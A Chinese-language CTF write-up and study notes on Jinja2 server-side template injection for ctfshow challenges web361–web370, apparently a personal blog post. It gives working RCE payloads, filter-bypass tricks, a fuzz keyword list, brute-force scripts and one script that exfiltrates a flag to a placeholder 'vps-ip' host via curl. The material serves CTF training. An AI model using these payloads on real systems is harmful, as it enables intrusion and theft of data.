# ctfshow_ssti


ctfshow ssti漏洞专题

python jinja2

<!--more-->

ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入

## 先抄抄笔记

### 代码块

```
变量块 {{}}  用于将表达式打印到模板输出
注释块 {##}  注释
控制块 {百分号%}  可以声明变量，也可以执行语句 //这个标签会造成GitHub报错，所以用文字替换了
{% for i in ''.__class__.__mro__[1].__subclasses__() %}{% if i.__name__=='_wrap_close' %}{百分号 print i.__init__.__globals__['popen']('ls').read() %}{% endif %}{% endfor %}

行声明 ##    可以有和{百分号%}相同的效果
```

### 常用方法

```
python的str(字符串)、dict(字典)、tuple(元组)、list(列表)这些在Python类结构的基类都是object，而object拥有众多的子类。

[].__class__：列表 
''.__class__ ：字符串
().__class__ ：元组
{}.__class__：字典
------------------------------------------------------------
有这些类继承的方法，我们就可以从任何一个变量，回溯到最顶层基类（<class'object'>）中去，再获得到此基类所有实现的类，就可以获得到很多的类和方法了。

__class__ ：类的一个内置属性，查看实例对象的类。 
__base__ ：类型对象的直接基类 
__bases__ ：类型对象的全部基类（直接父类），以元组形式（只有一个元素），类型的实例通常没有属性 __bases__ 
__mro__ ：可以用来获取一个类的调用顺序，元组形式，返回如(<class 'str'>, <class 'object'>)。__mro__[1]就是object
------------------------------------------------------------
__subclasses__()：返回这个类的所有子类，列表形式。
__builtins__：内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。返回内建内建名称空间字典__builtins__与__builtin__的区别就不放了，百度都有。 （做为默认初始模块出现的，可用于查看当前所有导入的内建函数。，集合形式）
__init__：初始化类，返回的类型是function，可以用来跳到__globals__。
__globals__：会以字典的形式返回当前位置的所有全局变量，与 func_globals  等价。
__import__：动态加载类和函数，也就是导入模块，经常用于导入os模块，语法：__import__(模块名)。如：__import__('os').popen('ls').read()
------------------------------------------------------------
__dic__ ：类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里 
__getattribute__()：实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。 
__getitem__()：调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b') 
```

### SSTI-jinja2执行命令

```
内建函数 eval 执行命令
os 模块执行命令
popen 函数执行命令
importlib 类执行命令
linecache 函数执行命令
subprocess.Popen 类执行命令
```

### 一般注入流程

在检测到存在SSTI模板注入漏洞之后->获得内置类所对应的类->获得object基类->获得所有子类->获得可以执行shell命令的子类->找到该子类可以执行shell命令的方法->执行shell命令

## 靶场题目

### [web361]无过滤

```
http://ce35ed03-e23c-4193-91c5-a9cec7d03e26.challenge.ctf.show/?name={{7*7}}
```

回显49，存在ssti注入漏洞

获得内置类所对应的类

```
http://ce35ed03-e23c-4193-91c5-a9cec7d03e26.challenge.ctf.show/?name={{''.__class__}}
```

获得object基类

```
http://ce35ed03-e23c-4193-91c5-a9cec7d03e26.challenge.ctf.show/?name={{''.__class__.__base__}}
```

获得所有子类

```
http://ce35ed03-e23c-4193-91c5-a9cec7d03e26.challenge.ctf.show/?name={{''.__class__.__base__.__subclasses__()}}
```

![image-20240225123753296](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225123753296.png)

通过python脚本判断可以执行shell命令子类的索引值

以子类是否存在popen方法为例：

```python
import requests

for num in range(500):
    try:
        url = "http://53e07393-3341-47a7-b048-e4773c51a22c.challenge.ctf.show/?name={{''.__class__.__base__.__subclasses__()["+str(num)+"].__init__.__globals__['popen']}}"
        res = requests.get(url=url).text
        if 'popen' in res:
            print(num)
    except:
        pass

```

![image-20240225134714423](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225134714423.png)

执行shell命令

```
http://53e07393-3341-47a7-b048-e4773c51a22c.challenge.ctf.show/?name={{''.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('ls /').read()}}
```

![image-20240225134927105](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225134927105.png)

读取flag文件

![image-20240225135000860](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225135000860.png)

### [web362]过滤数字

开始过滤数字，写个python脚本测试一下哪些数字没被过滤

```python
import requests

for i in range(10):
    url = "http://e789961f-7694-423c-a72f-d00e630f15b3.challenge.ctf.show/?name="+str(i)
    res = requests.get(url=url).text
    if ":(" not in res:
        print(i)
```

![image-20240229163736123](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240229163736123.png)

可以用全角数字进行绕过

```
‘０’,‘１’,‘２’,‘３’,‘４’,‘５’,‘６’,‘７’,‘８’,‘９’
```

payload:

```
//根据上题序列，替换为全角数字
?name={{"".__class__.__bases__[０].__subclasses__()[１３２].__init__.__globals__['popen']('cat /flag').read()}}

以下payload是抄的，暂时抄一下
?name={{a.__init__.__globals__['__builtins__'].eval('__import__("os").popen("cat /flag").read()')}}

?name={{''.__class__.__bases__[0].__subclasses__()[１３２].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /flag").read()')}}

?name={{ config.__class__.__init__.__globals__['os'].popen('cat ../flag').read() }}
```

### [web363]过滤单双引号

`request.args.a`绕过

payload：

```
//request绕过
?name={{ config.__class__.__init__.__globals__[request.args.a].popen(request.args.b).read() }}&a=os&b=cat ../flag

//chr字符串拼接
?name={{x.__init__.__globals__[request.args.a].eval(request.args.b)}}&a=__builtins__&b=__import__('os').popen('cat /flag').read()
```

### [web364]过滤args 

用其他方式传参

payload:

```
?name={{x.__init__.__globals__[request.cookies.x1].eval(request.cookies.x2)}}

Cookie传参:x1=__builtins__;x2=__import__('os').popen('cat /flag').read()
```

发包：

```http
   GET /?name={{x.__init__.__globals__[request.cookies.x1].eval(request.cookies.x2)}} HTTP/1.1
Host: 21384bce-894b-46a7-9265-8b1cba126448.challenge.ctf.show
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Cookie: x1=__builtins__;x2=__import__('os').popen('cat /flag').read()
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
```

### [web365]过滤''、""、[、args

跑fuzzy字典，发现四个过滤：

```
//ssti-fuzz.txt
.
[
]
_
{
}
{{
}}
{百分号
%}
{%if
{%endif
{%print(
1
2
3
4
5
6
7
8
9
0
'
"
+
%2B
%2b
join()
u
os
popen
importlib
linecache
subprocess
|attr()
request
args
value
cookie
__getitem__()
__class__
__base__
__bases__
__mro__
__subclasses__()
__builtins__
__init__
__globals__
__import__
__dic__
__getattribute__()
__getitem__()
__str__()
lipsum
current_app
```

过滤了四个字符`''`、`""`、`[`、`args`

![image-20240304185245644](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304185245644.png)

测`os`模块在哪

```
{{x.__class__.__bases__.__getitem__(0).__subclasses__()}}
```

![image-20240304190026746](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304190026746.png)

原始payload：

```
{{''.__class__.__bases__.__getitem__(0).__subclasses__()[132].__init__.__globals__.popen('ls /').read()}}
```

`__getitem__`绕过中括号`[`过滤：

```
{{x.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(132).__init__.__globals__.popen('ls /').read()}}
```

`request对象`绕过引号`''`、`""`过滤，`cookie`绕过`args`过滤

```
{{x.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(132).__init__.__globals__.popen(request.cookies.x).read()}}

Cookie传参：x=ls /
```

成功进行命令执行后，改cookie传参：

```
x=cat /flag
```

![image-20240304193654541](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304193654541.png)

### [web366]过滤''、""、[、args、_

![image-20240304194812959](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304194812959.png)

在web366 payload基础上，进行`_`绕过

```
{{x.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(132).__init__.__globals__.popen(request.cookies.x).read()}}
```

`|attr()`+`request对象`绕过对下划线的过滤

```
""|attr("__class__")
相当于
"".__class__
```

```
{{x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3)(0)|attr(request.cookies.x4)()|attr(request.cookies.x5)(132)|attr(request.cookies.x6)|attr(request.cookies.x7).popen(request.cookies.x8).read()}}

Cookie传参：
x1=__class__;x2=__bases__;x3=__getitem__;x4=__subclasses__;x5=__getitem__;x6=__init__;x7=__globals__;x8=tac /f*
```

没通......

### [web367]过滤''、""、[、args、_、os

通过cookie传os

```
{{(lipsum|attr(request.cookies.x1)).get(request.cookies.x2).popen(request.cookies.x3).read()}}

Cookie传参：x1= __globals__;x2=os;x3=tac /flag
```

![image-20240304202430444](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304202430444.png)

### [web368]过滤''、""、[、args、_、os、{{

通过`{百分号print(......)%}`替代`{{...}}`来绕过对`{花括号`的过滤

```
{百分号print(lipsum|attr(request.cookies.x1)).get(request.cookies.x2).popen(request.cookies.x3).read()%}

Cookie传参：x1= __globals__;x2=os;x3=tac /flag
```

也可以用`{百分号set`来绕过

```
{百分号set aaa=(lipsum|attr(request.cookies.x1)).get(request.cookies.x2).popen(request.cookies.x3).read()%}{百分号print(aaa)%}

Cookie传参：x1= __globals__;x2=os;x3=tac /flag
```

{% raw %}

### [web369]过滤''、""、[、args、_、os、{{、request

抄了以下payload：

#### payload1：读取`/flag`文件：

```
?name=
{% set po=dict(po=1,p=2)|join}
{% set a=(()|select|string|list)|attr(po)(24)%}
{% set re=dict(reque=1,st=1)|join%}
{% set in=(a~a~dict(init=a)|join~a~a)|join()%}
{% set gl=(a~a~dict(globals=q)|join~a~a)|join()%}
{% set ge=(a~a~dict(getitem=a)|join~a~a)%}
{% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%}
{% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%}
{% set chr=x.chr%}
{% set f=chr(47)~(dict(flag=a)|join)%}
{% print(x.open(f).read())%}
```

详解：

```
//构造pop
{% set po=dict(po=1,p=2)|join%}

//构造下划线 _
{% set a=(()|select|string|list)|attr(po)(24)%}

//构造request
{% set re=dict(reque=1,st=1)|join%}

//构造__init__
{% set in=(a~a~dict(init=a)|join~a~a)|join()%}

//构造__globals__
{% set gl=(a~a~dict(globals=q)|join~a~a)|join()%}

//构造__getitem__
{% set ge=(a~a~dict(getitem=a)|join~a~a)%}

//构造__builtins__
{% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%}

//【构造】q.__init__.__globals__.__getitem__.__builtins__
{% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%}

//构造chr函数
{% set chr=x.chr%}

// 构造/flag
{% set f=chr(47)~(dict(flag=a)|join)%}

//读取文件/flag
{% print(x.open(f).read())%}
```

#### payload2：执行命令`cat /flag`

相当于`lipsum.__globals__['__builtins__'].open('/flag').read()`

```
?name={% print (lipsum|attr(
(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()
))
.get(
(config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()
)
.popen(
(config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()
).read() %}
```

#### payload3：执行命令`cat /flag`

```
//构造下划线_
?name={%set%20xiahua=(lipsum|select|string|list).pop(24)%}

{%set gb=(xiahua,xiahua,dict(glo=a,bals=a)|join,xiahua,xiahua)|join%}
{%set gm=(xiahua,xiahua,dict(ge=a,titem=a)|join,xiahua,xiahua)|join%}
{%set bl=(xiahua,xiahua,dict(builtins=a)|join,xiahua,xiahua)|join%}
{%set chcr=(lipsum|attr(gb)|attr(gm)(bl)).chr%}
{%set oo=dict(o=a,s=a)|join%}
{%set pp=dict(po=a,pen=a)|join%}
{%set space=chcr(32)%}
{%set xiegang=chcr(47)%}
{%set f1ag=dict(fl=a,ag=a)|join%}
{%set shell=(dict(cat=a)|join,space,xiegang,f1ag)|join%}
{%print lipsum|attr(gb)|attr(gm)(oo)|attr(pp)(shell)|attr(dict(re=a,ad=a)|join)()%}
```

### [web370]过滤''、""、[、args、_、os、{{、request、数字

以web369的payload进行修改：

```
?name=
{% set po=dict(po=1,p=2)|join%}
{% set a=(()|select|string|list)|attr(po)(24)%}
{% set re=dict(reque=1,st=1)|join%}
{% set in=(a~a~dict(init=a)|join~a~a)|join()%}
{% set gl=(a~a~dict(globals=q)|join~a~a)|join()%}
{% set ge=(a~a~dict(getitem=a)|join~a~a)%}
{% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%}
{% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%}
{% set chr=x.chr%}
{% set f=chr(47)~(dict(flag=a)|join)%}
{% print(x.open(f).read())%}
```

#### payload1：全角数字绕过

```
'０','１','２','３','４','５','６','７','８','９'
```

用全角数字替换payload中的半角数字

```
?name=
{% set po=dict(po=１,p=２)|join%}
{% set a=(()|select|string|list)|attr(po)(２４)%}
{% set re=dict(reque=１,st=１)|join%}
{% set in=(a~a~dict(init=a)|join~a~a)|join()%}
{% set gl=(a~a~dict(globals=q)|join~a~a)|join()%}
{% set ge=(a~a~dict(getitem=a)|join~a~a)%}
{% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%}
{% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%}
{% set chr=x.chr%}
{% set f=chr(４７)~(dict(flag=a)|join)%}
{% print(x.open(f).read())%}
```

#### payload2：构造数字

```
{% set cc=(dict(ee=a)|join|count)%}
{% set cccc=(dict(eeee=a)|join|length)%}
从而cc=2,cccc=4

再{% set coun=(cc~cccc)|int%}  -->  coun=24
快速得到一个数值
```

所以，构造

```
{% set ershisi=(cc~cccc)|int%}
{% set po=dict(po=c,p=c)|join%}
{% set a=(()|select|string|list)|attr(po)(ershisi)%}

等效于：

{% set a=(()|select|string|list)|pop(24)%}
```

payload：

```
?name=
{% set c=(dict(e=a)|join|count)%} 
{% set cc=(dict(ee=a)|join|count)%} 
{% set ccc=(dict(eee=a)|join|count)%} 
{% set cccc=(dict(eeee=a)|join|count)%}
{% set ccccccc=(dict(eeeeeee=a)|join|count)%} 
{% set cccccccc=(dict(eeeeeeee=a)|join|count)%} 
{% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%}
{% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%}

{% set twoandfour=(cc~cccc)|int%}
{% set fourandseven=(cccc~ccccccc)|int%} 

{% set po=dict(po=b,p=b)|join%}
{% set a=(()|select|string|list)|attr(po)(twoandfour)%}
{% set re=dict(reque=b,st=b)|join%}
{% set in=(a~a~dict(init=a)|join~a~a)|join()%}
{% set gl=(a~a~dict(globals=q)|join~a~a)|join()%}
{% set ge=(a~a~dict(getitem=a)|join~a~a)%}
{% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%}
{% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%}
{% set chr=x.chr%}
{% set f=chr(fourandseven)~(dict(flag=a)|join)%}
{% print(x.open(f).read())%}
```

#### payload3：index构造数字

```
?name=
{% set o=(dict(o=z)|join) %}
{% set n=dict(n=z)|join %}
{% set ershisi=(()|select|string|list).index(o)*(()|select|string|list).index(n) %}
{% set liushisi=(()|select|string|list).index(o)*(()|select|string|list).index(o) %}
{% set xiegang=(config|string|list).pop(-liushisi) %}
{% set gang=(()|select|string|list).pop(ershisi) %}
{% set globals=(gang,gang,(dict(globals=z)|join),gang,gang)|join %}
{% set builtins=(gang,gang,(dict(builtins=z)|join),gang,gang)|join %}
{% set gangfulaige=(xiegang,dict(flag=z)|join)|join %}
{% print (lipsum|attr(globals)).get(builtins).open(gangfulaige).read() %}
```

#### payload4：反弹shell

```
import requests
cmd='__import__("os").popen("curl http://vps-ip:9023?p=`cat /flag`").read()'
def fun1(s):
	t=[]
	for i in range(len(s)):
		t.append(ord(s[i]))
	k=''
	t=list(set(t))
	for i in t:
		k+='{% set '+'e'*(t.index(i)+1)+'=dict('+'e'*i+'=a)|join|count%}\n'
	return k
def fun2(s):
	t=[]
	for i in range(len(s)):
		t.append(ord(s[i]))
	t=list(set(t))
	k=''
	for i in range(len(s)):
		if i<len(s)-1:
			k+='chr('+'e'*(t.index(ord(s[i]))+1)+')%2b'
		else:
			k+='chr('+'e'*(t.index(ord(s[i]))+1)+')'
	return k
url ='http://fc5ded74-98ba-4d98-a6f9-47ab2616ba41.challenge.ctf.show/?name='+fun1(cmd)+'''
{% set coun=dict(eeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(coun)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd='''+fun2(cmd)+'''
%}
{%if x.eval(cmd)%}
abc
{%endif%}
'''
print(url)
```

执行脚本得到payload：

```
http://2904f8f4-2f84-46b4-9f47-a720651f1578.challenge.ctf.show/?name={%%20set%20e=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20ee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20coun=dict(eeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20po=dict(po=a,p=a)|join%}%20{%%20set%20a=(()|select|string|list)|attr(po)(coun)%}%20{%%20set%20ini=(a,a,dict(init=a)|join,a,a)|join()%}%20{%%20set%20glo=(a,a,dict(globals=a)|join,a,a)|join()%}%20{%%20set%20geti=(a,a,dict(getitem=a)|join,a,a)|join()%}%20{%%20set%20built=(a,a,dict(builtins=a)|join,a,a)|join()%}%20{%%20set%20x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}%20{%%20set%20chr=x.chr%}%20{%%20set%20cmd=chr(eeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeee)%2bchr(eee)%2bchr(ee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(ee)%2bchr(eeee)%2bchr(eeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eee)%2bchr(ee)%2bchr(eeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(e)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeee)%2bchr(eeeeee)%2bchr(eeeeee)%2bchr(eeeeeeeeeeee)%2bchr(eeeee)%2bchr(eeeeeeeee)%2bchr(eeeeeeeee)%2bchr(eeeeeeeee)%2bchr(eeeee)%2bchr(eeeeeeee)%2bchr(eeeeeeeeeeee)%2bchr(eeeeeee)%2bchr(eeeee)%2bchr(eeeeeeee)%2bchr(eeeeeeeeeee)%2bchr(eeeeeeeeeee)%2bchr(eeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeee)%2bchr(eeeeeee)%2bchr(eeeeeeeee)%2bchr(eeeeeeeeee)%2bchr(eeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(e)%2bchr(eeeeee)